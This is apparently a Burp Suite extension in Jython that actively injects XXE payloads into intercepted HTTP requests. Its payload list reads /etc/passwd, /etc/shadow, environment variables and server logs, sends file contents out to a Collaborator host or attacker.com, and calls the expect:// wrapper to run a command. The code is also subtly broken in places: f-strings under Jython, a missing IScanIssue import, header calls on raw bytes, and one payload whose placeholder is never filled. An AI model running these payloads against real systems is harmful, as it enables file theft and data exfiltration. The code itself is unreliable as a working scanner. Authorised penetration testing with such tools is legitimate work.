from burp import IBurpExtender
from burp import IHttpListener
from burp import IScannerCheck
from burp import IExtensionStateListener
from burp import IContextMenuFactory
from burp import IContextMenuInvocation
from java.util import List, ArrayList
from java.net import URL
from java.io import PrintWriter
import re

class BurpExtender(IBurpExtender, IHttpListener, IScannerCheck, IExtensionStateListener, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)
        self._callbacks.setExtensionName("XXE Scanner")

        self._callbacks.registerHttpListener(self)
        self._callbacks.registerScannerCheck(self)
        self._callbacks.registerExtensionStateListener(self)
        self._callbacks.registerContextMenuFactory(self)

        self._stdout.println("XXE Scanner loaded")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return
        if toolFlag in [self._callbacks.TOOL_PROXY, self._callbacks.TOOL_REPEATER]:
            self.perform_xxe_checks(messageInfo, isScanner=False)

    def doActiveScan(self, baseRequestResponse, issueAddCallback):
        self.perform_xxe_checks(baseRequestResponse, isScanner=True, issueAddCallback=issueAddCallback)
        return None

    def doPassiveScan(self, baseRequestResponse):
        self.perform_xxe_checks(baseRequestResponse, isScanner=False)
        return None

    def perform_xxe_checks(self, baseRequestResponse, isScanner, issueAddCallback=None):
        request = baseRequestResponse.getRequest()
        analyzedRequest = self._helpers.analyzeRequest(request)
        xxe_payloads = self.get_xxe_payloads()

        self.check_for_xxe(baseRequestResponse, analyzedRequest.getHeaders(), xxe_payloads, "Header", "Content-Type", isScanner, issueAddCallback)
        self.check_for_xxe(baseRequestResponse, [request[analyzedRequest.getBodyOffset():].tostring()], xxe_payloads, "Body", "<replace_me>", isScanner, issueAddCallback)
        for parameter in analyzedRequest.getParameters():
            self.check_for_xxe(baseRequestResponse, [parameter.getValue()], xxe_payloads, "Parameter", parameter.getName(), isScanner, issueAddCallback)

    def check_for_xxe(self, baseRequestResponse, injection_points, xxe_payloads, injection_type, injection_point_name, isScanner, issueAddCallback):
        for injection_point in injection_points:
            for payload in xxe_payloads:
                try:
                    modified_injection_point = injection_point.replace("<replace_me>", payload) if "<replace_me>" in injection_point else payload
                    if injection_type == "Header":
                        modified_headers = list(baseRequestResponse.getRequest().getHeaders())
                        for i, header in enumerate(modified_headers):
                            if injection_point_name.lower() in header.lower():
                                modified_headers[i] = injection_point_name + ": " + modified_injection_point
                                break
                        modified_request = self._helpers.buildHttpMessage(modified_headers, baseRequestResponse.getRequest()[self._helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset():])
                    elif injection_type == "Body":
                        modified_request = self._helpers.buildHttpMessage(baseRequestResponse.getRequest().getHeaders(), modified_injection_point)
                    elif injection_type == "Parameter":
                        params = self._helpers.analyzeRequest(baseRequestResponse.getRequest()).getParameters()
                        param_type = 0
                        for param in params:
                            if param.getName() == injection_point_name:
                                param_type = param.getType()
                                break
                        modified_request = self._helpers.updateParameter(baseRequestResponse.getRequest(), self._helpers.buildParameter(injection_point_name, modified_injection_point, param_type))
                    else:
                        self._stdout.println("Invalid injection type")
                        continue

                    self._stdout.println(f"Testing XXE in {injection_type}: {injection_point_name} with payload: {payload[:50]}...")
                    response = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modified_request)
                    self.analyze_response(baseRequestResponse, response, payload, injection_type, injection_point_name, isScanner, issueAddCallback)

                except Exception as e:
                    self._stderr.println(f"Error during XXE check: {e}")
                    self._stderr.println(e)

    def analyze_response(self, original_request_info, response, payload, injection_type, injection_point_name, isScanner, issueAddCallback):
        if response is None:
            self._stderr.println("Response is None. Skipping analysis.")
            return

        analyzedResponse = self._helpers.analyzeResponse(response.getResponse())
        responseBody = response.getResponse()[analyzedResponse.getBodyOffset():].tostring()
        responseCode = analyzedResponse.getStatusCode()
        indicators = ["root:", "win.ini", "DOCTYPE", "base64", "Invalid", "error", "exception", "java.io.FileNotFoundException"] #Added java.io.FileNotFoundException

        if any(indicator in responseBody for indicator in indicators) or responseCode >= 500:
            self.report_issue(original_request_info, response, payload, injection_type, injection_point_name, isScanner, issueAddCallback, "XXE Vulnerability")

        collaborator = self._callbacks.createBurpCollaboratorClientContext()
        if collaborator.hasCollaboratorInteractions(payload):
            self.report_issue(original_request_info, response, payload, injection_type, injection_point_name, isScanner, issueAddCallback, "XXE Out-of-Band Interaction", collaborator)

    def report_issue(self, original_request_info, response, payload, injection_type, injection_point_name, isScanner, issueAddCallback, issue_name, collaborator=None):
        interaction_details = ""
        if collaborator:
            interactions = collaborator.fetchAllCollaboratorInteractions()
            for interaction in interactions:
                interaction_details += interaction.getDetails() + "\n"
        analyzedResponse = self._helpers.analyzeResponse(response.getResponse())
        responseBody = response.getResponse()[analyzedResponse.getBodyOffset():].tostring()
        responseCode = analyzedResponse.getStatusCode()

        issue = CustomScanIssue(
            original_request_info.getHttpService(),
            self._helpers.analyzeRequest(original_request_info).getUrl(),
            [original_request_info, response],
            f"{issue_name} in {injection_type}: {injection_point_name}",
            f"{issue_name} found. Payload: {payload[:100]}...\nResponse Code: {responseCode}\nResponse: {responseBody[:500]}...\nCollaborator Interactions:\n{interaction_details}",
            "High"
        )
        if isScanner:
            if issueAddCallback:
                issueAddCallback.addScanIssue(issue)
        else:
            self._callbacks.addScanIssue(issue)

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        if existingIssue.getIssueDetail() == newIssue.getIssueDetail():
            return -1
        return 0

    def extensionUnloaded(self):
        self._stdout.println("XXE Scanner unloaded")

    def createMenuItems(self, invocation):
        menuList = ArrayList()
        menuList.add("Send to XXE Scanner (Active)")
        return menuList

    def get_xxe_payloads(self):
        collaborator = self._callbacks.createBurpCollaboratorClientContext()
        interaction = collaborator.generatePayload(True)
        collaborator_payload = interaction.getPayload()

        return [
            # Basic file retrieval
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>", # Linux
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"> ]><root>&xxe;</root>", # Windows
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/hosts\"> ]><root>&xxe;</root>", #hosts file
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///proc/self/environ\"> ]><root>&xxe;</root>", #Environment variables
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///proc/version\"> ]><root>&xxe;</root>",#Kernel version
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///proc/cpuinfo\"> ]><root>&xxe;</root>", #CPU info
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/shadow\"> ]><root>&xxe;</root>", #Shadow file
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/group\"> ]><root>&xxe;</root>", #Group file
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\"> ]><root>&xxe;</root>", #Hostname
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/issue\"> ]><root>&xxe;</root>", #OS Version
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/os-release\"> ]><root>&xxe;</root>", #OS Release info
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///var/log/auth.log\"> ]><root>&xxe;</root>", #Auth log
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///var/log/syslog\"> ]><root>&xxe;</root>", #Syslog
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\"> ]><root>&xxe;</root>", #Apache access log
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///var/log/apache2/error.log\"> ]><root>&xxe;</root>", #Apache error log
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///var/log/nginx/access.log\"> ]><root>&xxe;</root>", #Nginx access log
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///var/log/nginx/error.log\"> ]><root>&xxe;</root>", #Nginx error log
            # PHP filter
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"> ]><root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> ]><root>&xxe;</root>",
            # External DTD with Collaborator
            f"<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://{collaborator_payload}\"> %xxe; ]><root>&send;</root>",
            f"<!DOCTYPE foo SYSTEM \"http://{collaborator_payload}\"><root>&xxe;</root>",
            f"""<!DOCTYPE foo [
                <!ENTITY % ext SYSTEM "http://{collaborator_payload}/evil.dtd">
                %ext;
                %trigger;
            ]>
            <root>&send;</root>""",
            # Blind XXE with Collaborator (HTTP)
            f"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{collaborator_payload}/?x=%file;\"> %xxe;]><root>&xxe;</root>",
            f"<!DOCTYPE foo [ <!ENTITY % data SYSTEM \"file:///etc/passwd\"> <!ENTITY % param \"<!ENTITY &#x25; send SYSTEM 'http://{collaborator_payload}/?data=%data;'>\"> %param; %send; ]><root>&send;</root>",
            # Blind XXE with error messages
            "<!DOCTYPE foo [ <!ENTITY % data SYSTEM \"file:///this/file/does/not/exist\"> <!ENTITY % param \"<!ENTITY &#x25; send SYSTEM 'http://{collaborator_payload}/?error=%data;'>\"> %param; %send; ]><root>&send;</root>",
            #Bypass of some WAFs or input sanitization by encoding
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://%2fetc%2fpasswd\">]><root>&xxe;</root>", #URL encoding of the file path
            "<!DOCTYPE foo SYSTEM \"data://text/plain;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48ISFE T0NUWVBFIHBhcmFtIFt8PCFFTlRJVFkgJXBlIFNZU1RFTSAiaHR0cDovL2F0dGFja2VyLmNvbS9ldmlsLmR0ZCI+JXBlOyVwYXJhbTE7XT48cm9vdC8+\">", #Base64 encoded payload
            "<!DOCTYPE foo SYSTEM \"expect://id\">", #Expect wrapper
            "<!ENTITY % remote SYSTEM 'http://attacker.com/ext.dtd'>%remote;", #Parameter entity for external DTD
            "<!ENTITY file SYSTEM \"php://filter/convert.base64-encode/resource=file:///etc/passwd\">", #PHP filter for local file inclusion
        ]

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Tentative"

    def getIssueDetail(self):
        return self._detail

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
